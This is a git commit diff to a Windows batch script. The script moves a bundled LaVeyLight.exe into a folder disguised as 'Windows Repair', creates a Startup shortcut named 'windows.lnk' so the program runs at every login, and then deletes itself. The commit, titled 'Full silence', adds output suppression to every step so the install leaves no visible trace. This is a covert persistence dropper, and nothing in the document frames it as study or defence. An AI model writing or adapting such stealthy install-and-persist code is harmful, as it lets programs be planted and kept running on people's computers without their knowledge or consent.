5994cec3cd723b87d8e2a572013f8f09bdb2bcf1
wladutu <63238534+wladutu@users.noreply.github.com>
2021-02-21 02:55:21 +0200

    Full silence

--- a.bat
+++ a.bat
@@ -1,13 +1,13 @@
 @echo off
-SET FOLDER=%HOMEDRIVE%\Windows Repair >NUL
-RMDIR /s /q "%FOLDER%"
-MOVE "%~dp0LaVeyLightFiles" "%FOLDER%"
+SET FOLDER=%HOMEDRIVE%\Windows Repair
+RMDIR /s /q "%FOLDER%" 1>NUL 2>NUL
+MOVE "%~dp0LaVeyLightFiles" "%FOLDER%" 1>NUL 2>NUL
 ECHO Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
 ECHO sLinkFile = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\windows.lnk" >> CreateShortcut.vbs
 ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
 ECHO oLink.TargetPath = "%FOLDER%\LaVeyLight.exe" >> CreateShortcut.vbs
-ECHO oLink.Save >> CreateShortcut.vbs
-cscript CreateShortcut.vbs
-DEL CreateShortcut.vbs
+ECHO oLink.Save >> CreateShortcut.vbs 
+cscript CreateShortcut.vbs 1>NUL 2>NUL
+DEL CreateShortcut.vbs 1>NUL 2>NUL
 cls
 DEL %0 >NUL 2>NUL
